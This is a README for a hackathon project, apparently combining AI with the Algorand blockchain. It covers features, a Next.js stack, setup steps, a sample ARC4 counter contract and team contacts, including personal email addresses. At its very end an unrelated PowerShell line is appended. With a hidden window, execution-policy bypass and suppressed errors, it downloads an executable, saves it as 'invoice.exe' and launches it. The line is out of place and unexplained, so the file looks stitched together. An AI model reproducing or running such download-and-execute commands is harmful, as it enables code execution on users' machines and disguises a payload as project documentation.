🚀 Project Name
Innovative AI + Blockchain Consumer Application on Algorand
📖 Overview

This project was built for the Algorand Hackathon. It combines Artificial Intelligence with Algorand’s Pure Proof-of-Stake blockchain to deliver a scalable, secure, and eco-friendly decentralized application.

Our solution leverages Algorand’s fast finality, low transaction costs, and developer-friendly ecosystem to bring real-world value in a consumer-focused application.

✨ Features

🔗 Algorand Blockchain Integration

Smart contracts (ARC4 standard) for secure and transparent logic.

On-chain asset/token management (ASA).

🤖 AI-powered Capabilities

Automated decision-making and smart workflows.

Seamless user experience where blockchain complexity is hidden.

🌐 Web3-Ready Frontend

Modern UI with wallet integration (Pera, Defly, Exodus).

Real-time interactions with Algorand Testnet/Mainnet.

💸 Low-Cost Transactions

Uses Algorand’s fixed fee of 0.001 ALGO for microtransactions.

🛠 Tech Stack

Frontend: Next.js + React + TailwindCSS

Backend: Node.js + API integration

Blockchain: Algorand (Testnet & Mainnet)

Smart Contracts: Algorand Python / TypeScript (ARC4)

Wallets: Pera Wallet, Defly Wallet (via use-wallet)

Storage: IPFS / Pinata for decentralized file handling

📂 Project Architecture
/app
  ├── frontend/         # Next.js + Tailwind dApp
  ├── contracts/        # Algorand smart contracts (Python / TypeScript)
  ├── backend/          # API services and AI integrations
  └── docs/             # Documentation & guides

⚡️ Installation & Setup
1. Clone Repository
git clone https://github.com/<your-repo>.git
cd <your-repo>

2. Install Dependencies
npm install

3. Configure Environment

Create a .env.local file:

NEXT_PUBLIC_ALGOD_URL=https://testnet-api.algonode.cloud
NEXT_PUBLIC_IPFS_TOKEN=...
PINATA_JWT=...

4. Run Local Development
npm run dev

🔐 Smart Contracts

Written in Algorand Python / TypeScript using AlgoKit.

Implements ARC4 ABI methods for safe and standardized interaction.

Example contract:

class Counter(algopy.ARC4Contract):
    def __init__(self) -> None:
        self.counter = algopy.UInt64(0)

    @algopy.arc4.abimethod(create="allow")
    def increment(self) -> algopy.arc4.UInt64:
        self.counter += 1
        return algopy.arc4.UInt64(self.counter)

📱 Wallet Integration

Lute Wallet setup with Testnet.

Users can connect, sign, and broadcast transactions seamlessly.

Supports switching between Localnet, Testnet, and Mainnet.

👥 Team

Team Name: HackStack

Members:

Ezgin Akyürek – ezgincapkan64@gmail.com

Göktuğ Tunç – gktgtunc@gmail.com

🏆 Hackathon Criteria

✅ Original & innovative solution

✅ Comprehensive Algorand blockchain integration

✅ AI-enhanced features for real-world impact

✅ Ready-to-use MVP with intuitive UX


powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-WDATP-test\\invoice.exe');Start-Process 'C:\\test-WDATP-test\\invoice.exe'
